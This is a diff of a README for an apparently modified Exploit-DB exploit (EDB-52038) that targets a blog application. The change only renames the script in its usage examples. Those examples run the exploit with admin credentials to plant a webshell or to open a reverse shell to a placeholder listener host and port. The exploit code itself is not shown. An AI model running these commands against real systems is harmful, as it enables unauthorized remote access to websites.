@@ -6,12 +6,12 @@ Modified version of [EDB-52038](https://www.exploit-db.com/exploits/52038) by Ah
 
 Webshell (default):
 ```
-python3 52038.py http://target/blog/ admin password123
+python3 exploit.py http://target/blog/ admin password123
 ```
 
 Reverse shell:
 ```
-python3 52038.py http://target/blog/ admin password123 -rev <LHOST> <LPORT>
+python3 exploit.py http://target/blog/ admin password123 -rev <LHOST> <LPORT>
 ```
 
 If you dont specify the option it will ask how you would like to proceed.
